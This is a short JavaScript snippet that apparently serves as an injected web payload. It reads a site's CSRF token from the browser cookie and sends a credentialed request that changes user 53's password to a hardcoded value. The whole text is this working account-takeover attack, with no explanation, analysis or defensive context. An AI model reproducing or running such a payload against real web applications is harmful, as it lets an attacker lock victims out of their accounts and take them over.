c=document.cookie.match(/csrftoken=([^;]+)/)[1];
fetch('/api/v1/users/53/update-password/', {
  method:'POST',
  credentials:'include',
  headers:{'X-Csrftoken':c,'Content-Type':'application/json'},
  body:JSON.stringify({
    password:'1@Mumbai999',
    password_confirmation:'1@Mumbai999'
  })
});
